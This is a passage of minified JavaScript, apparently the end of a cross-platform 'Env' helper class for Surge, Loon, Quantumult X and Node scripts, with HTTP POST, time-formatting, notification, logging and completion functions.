t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}